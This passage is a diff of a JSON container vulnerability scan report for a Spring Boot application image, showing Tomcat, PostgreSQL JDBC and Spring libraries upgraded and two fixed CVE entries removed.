+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-24880",
@@ -1756,16 +1269,16 @@
         {
           "VulnerabilityID": "CVE-2026-34483",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.116, 10.1.54, 11.0.21",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-34483",
@@ -1849,16 +1362,16 @@
         {
           "VulnerabilityID": "CVE-2026-34487",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.117, 10.1.54, 11.0.21",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-34487",
@@ -1948,16 +1461,16 @@
         {
           "VulnerabilityID": "CVE-2026-41284",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.118, 10.1.55, 11.0.22",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41284",
@@ -2015,16 +1528,16 @@
         {
           "VulnerabilityID": "CVE-2026-42498",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.118, 10.1.55, 11.0.22",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42498",
@@ -2082,16 +1595,16 @@
         {
           "VulnerabilityID": "CVE-2026-43513",
           "PkgName": "org.apache.tomcat.embed:tomcat-embed-core",
-          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.33.jar",
+          "PkgPath": "app/BOOT-INF/lib/tomcat-embed-core-10.1.40.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.33",
-            "UID": "6b124b5043b8dd9a"
+            "PURL": "pkg:maven/org.apache.tomcat.embed/tomcat-embed-core@10.1.40",
+            "UID": "27ce219308875bc0"
           },
-          "InstalledVersion": "10.1.33",
+          "InstalledVersion": "10.1.40",
           "FixedVersion": "9.0.118, 10.1.55, 11.0.22",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-43513",
@@ -2147,83 +1660,18 @@
           "LastModifiedDate": "2026-06-17T10:49:50.74Z"
         },
         {
-          "VulnerabilityID": "CVE-2025-49146",
-          "PkgName": "org.postgresql:postgresql",
-          "PkgPath": "app/BOOT-INF/lib/postgresql-42.7.4.jar",
-          "PkgIdentifier": {
-            "PURL": "pkg:maven/org.postgresql/postgresql@42.7.4",
-            "UID": "87d00b5d8ff5740b"
-          },
-          "InstalledVersion": "42.7.4",
-          "FixedVersion": "42.7.7",
-          "Status": "fixed",
-          "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-49146",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory Maven",
-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
-          },
-          "Title": "pgjdbc: pgjdbc insecure authentication in channel binding",
-          "Description": "pgjdbc is an open source postgresql JDBC Driver. From 42.7.4 and until 42.7.7, when the PostgreSQL JDBC driver is configured with channel binding set to required (default value is prefer), the driver would incorrectly allow connections to proceed with authentication methods that do not support channel binding (such as password, MD5, GSS, or SSPI authentication). This could allow a man-in-the-middle attacker to intercept connections that users believed were protected by channel binding requirements. This vulnerability is fixed in 42.7.7.",
-          "Severity": "HIGH",
-          "CweIDs": [
-            "CWE-287"
-          ],
-          "VendorSeverity": {
-            "bitnami": 3,
-            "ghsa": 3,
-            "nvd": 2,
-            "redhat": 3
-          },
-          "CVSS": {
-            "bitnami": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
-              "V3Score": 8.2
-            },
-            "ghsa": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
-              "V3Score": 8.2
-            },
-            "nvd": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
-              "V3Score": 5.9
-            },
-            "redhat": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
-              "V3Score": 8.2
-            }
-          },
-          "References": [
-            "https://access.redhat.com/security/cve/CVE-2025-49146",
-            "https://datatracker.ietf.org/doc/html/rfc5802",
-            "https://datatracker.ietf.org/doc/html/rfc7677",
-            "https://github.com/pgjdbc/pgjdbc",
-            "https://github.com/pgjdbc/pgjdbc/commit/9217ed16cb2918ab1b6b9258ae97e6ede244d8a0",
-            "https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-hq9p-pm7w-8p54",
-            "https://nvd.nist.gov/vuln/detail/CVE-2025-49146",
-            "https://www.cve.org/CVERecord?id=CVE-2025-49146",
-            "https://www.postgresql.org/docs/current/sasl-authentication.html#SASL-SCRAM-SHA-256"
-          ],
-          "PublishedDate": "2025-06-11T15:15:42.85Z",
-          "LastModifiedDate": "2026-06-17T09:30:49.57Z"
-        },
-        {
           "VulnerabilityID": "CVE-2026-42198",
           "PkgName": "org.postgresql:postgresql",
-          "PkgPath": "app/BOOT-INF/lib/postgresql-42.7.4.jar",
+          "PkgPath": "app/BOOT-INF/lib/postgresql-42.7.7.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.postgresql/postgresql@42.7.4",
-            "UID": "87d00b5d8ff5740b"
+            "PURL": "pkg:maven/org.postgresql/postgresql@42.7.7",
+            "UID": "e448f4c98c9343ba"
           },
-          "InstalledVersion": "42.7.4",
+          "InstalledVersion": "42.7.7",
           "FixedVersion": "42.7.11",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-42198",
@@ -2296,16 +1744,16 @@
         {
           "VulnerabilityID": "CVE-2026-54291",
           "PkgName": "org.postgresql:postgresql",
-          "PkgPath": "app/BOOT-INF/lib/postgresql-42.7.4.jar",
+          "PkgPath": "app/BOOT-INF/lib/postgresql-42.7.7.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.postgresql/postgresql@42.7.4",
-            "UID": "87d00b5d8ff5740b"
+            "PURL": "pkg:maven/org.postgresql/postgresql@42.7.7",
+            "UID": "e448f4c98c9343ba"
           },
-          "InstalledVersion": "42.7.4",
+          "InstalledVersion": "42.7.7",
           "FixedVersion": "42.7.12",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54291",
@@ -2358,72 +1806,18 @@
           "LastModifiedDate": "2026-07-09T13:16:25.717Z"
         },
         {
-          "VulnerabilityID": "CVE-2025-22235",
-          "PkgName": "org.springframework.boot:spring-boot",
-          "PkgPath": "app/BOOT-INF/lib/spring-boot-3.4.0.jar",
-          "PkgIdentifier": {
-            "PURL": "pkg:maven/org.springframework.boot/spring-boot@3.4.0",
-            "UID": "8b1592a8a0d70e3d"
-          },
-          "InstalledVersion": "3.4.0",
-          "FixedVersion": "3.3.11, 3.4.5",
-          "Status": "fixed",
-          "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
-          },
-          "SeveritySource": "ghsa",
-          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-22235",
-          "DataSource": {
-            "ID": "ghsa",
-            "Name": "GitHub Security Advisory Maven",
-            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
-          },
-          "Title": "org.springframework.boot/spring-boot: Spring Boot EndpointRequest.to() creates wrong matcher if actuator endpoint is not exposed",
-          "Description": "EndpointRequest.to() creates a matcher for null/** if the actuator endpoint, for which the EndpointRequest has been created, is disabled or not exposed.\n\nYour application may be affected by this if all the following conditions are met:\n\n  *  You use Spring Security\n  *  EndpointRequest.to() has been used in a Spring Security chain configuration\n  *  The endpoint which EndpointRequest references is disabled or not exposed via web\n  *  Your application handles requests to /null and this path needs protection\n\n\nYou are not affected if any of the following is true:\n\n  *  You don't use Spring Security\n  *  You don't use EndpointRequest.to()\n  *  The endpoint which EndpointRequest.to() refers to is enabled and is exposed\n  *  Your application does not handle requests to /null or this path does not need protection",
-          "Severity": "HIGH",
-          "CweIDs": [
-            "CWE-20"
-          ],
-          "VendorSeverity": {
-            "ghsa": 3,
-            "redhat": 3
-          },
-          "CVSS": {
-            "ghsa": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
-              "V3Score": 7.3
-            },
-            "redhat": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
-              "V3Score": 7.3
-            }
-          },
-          "References": [
-            "https://access.redhat.com/security/cve/CVE-2025-22235",
-            "https://github.com/advisories/GHSA-rc42-6c7j-7h5r",
-            "https://github.com/spring-projects/spring-boot",
-            "https://nvd.nist.gov/vuln/detail/CVE-2025-22235",
-            "https://security.netapp.com/advisory/ntap-20250516-0010",
-            "https://security.netapp.com/advisory/ntap-20250516-0010/",
-            "https://spring.io/security/cve-2025-22235",
-            "https://www.cve.org/CVERecord?id=CVE-2025-22235"
-          ],
-          "PublishedDate": "2025-04-28T08:15:15.273Z",
-          "LastModifiedDate": "2026-06-17T08:45:48.46Z"
-        },
-        {
           "VulnerabilityID": "CVE-2026-40973",
           "PkgName": "org.springframework.boot:spring-boot",
-          "PkgPath": "app/BOOT-INF/lib/spring-boot-3.4.0.jar",
+          "PkgPath": "app/BOOT-INF/lib/spring-boot-3.4.5.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.springframework.boot/spring-boot@3.4.0",
-            "UID": "8b1592a8a0d70e3d"
+            "PURL": "pkg:maven/org.springframework.boot/spring-boot@3.4.5",
+            "UID": "1d834b0580855294"
           },
-          "InstalledVersion": "3.4.0",
+          "InstalledVersion": "3.4.5",
           "FixedVersion": "4.0.6, 3.5.14",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-40973",
@@ -2465,16 +1859,16 @@
         {
           "VulnerabilityID": "CVE-2025-41249",
           "PkgName": "org.springframework:spring-core",
-          "PkgPath": "app/BOOT-INF/lib/spring-core-6.2.0.jar",
+          "PkgPath": "app/BOOT-INF/lib/spring-core-6.2.6.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.springframework/spring-core@6.2.0",
-            "UID": "29a5f5bba9bdf113"
+            "PURL": "pkg:maven/org.springframework/spring-core@6.2.6",
+            "UID": "508212b834209da9"
           },
-          "InstalledVersion": "6.2.0",
+          "InstalledVersion": "6.2.6",
           "FixedVersion": "6.2.11",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-41249",
@@ -2519,16 +1913,16 @@
         {
           "VulnerabilityID": "CVE-2026-41850",
           "PkgName": "org.springframework:spring-expression",
-          "PkgPath": "app/BOOT-INF/lib/spring-expression-6.2.0.jar",
+          "PkgPath": "app/BOOT-INF/lib/spring-expression-6.2.6.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.springframework/spring-expression@6.2.0",
-            "UID": "3501aa831c4b9b03"
+            "PURL": "pkg:maven/org.springframework/spring-expression@6.2.6",
+            "UID": "bc5025ee9520292e"
           },
-          "InstalledVersion": "6.2.0",
+          "InstalledVersion": "6.2.6",
           "FixedVersion": "7.0.8, 6.2.19",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41850",
@@ -2572,16 +1966,16 @@
         {
           "VulnerabilityID": "CVE-2026-41842",
           "PkgName": "org.springframework:spring-webmvc",
-          "PkgPath": "app/BOOT-INF/lib/spring-webmvc-6.2.0.jar",
+          "PkgPath": "app/BOOT-INF/lib/spring-webmvc-6.2.6.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.springframework/spring-webmvc@6.2.0",
-            "UID": "f4d3f8d274e1bd15"
+            "PURL": "pkg:maven/org.springframework/spring-webmvc@6.2.6",
+            "UID": "d8ed0233a69f95b2"
           },
-          "InstalledVersion": "6.2.0",
+          "InstalledVersion": "6.2.6",
           "FixedVersion": "7.0.8, 6.2.19",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41842",
@@ -2625,16 +2019,16 @@
         {
           "VulnerabilityID": "CVE-2026-41845",
           "PkgName": "org.springframework:spring-webmvc",
-          "PkgPath": "app/BOOT-INF/lib/spring-webmvc-6.2.0.jar",
+          "PkgPath": "app/BOOT-INF/lib/spring-webmvc-6.2.6.jar",
           "PkgIdentifier": {
-            "PURL": "pkg:maven/org.springframework/spring-webmvc@6.2.0",
-            "UID": "f4d3f8d274e1bd15"
+            "PURL": "pkg:maven/org.springframework/spring-webmvc@6.2.6",
+            "UID": "d8ed0233a69f95b2"
           },
-          "InstalledVersion": "6.2.0",
+          "InstalledVersion": "6.2.6",
           "FixedVersion": "7.0.8, 6.2.19",
           "Status": "fixed",
           "Layer": {
-            "DiffID": "sha256:b07d47c71c21669819505a67a751a65a83a3f2e3ddd1a61e57e81f361bf832fb"
+            "DiffID": "sha256:2f6a067e28f42e1c983cf59118301ca61ba47e920f6ba0d61fb7d8804356cd31"
           },
           "SeveritySource": "ghsa",
           "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41845",
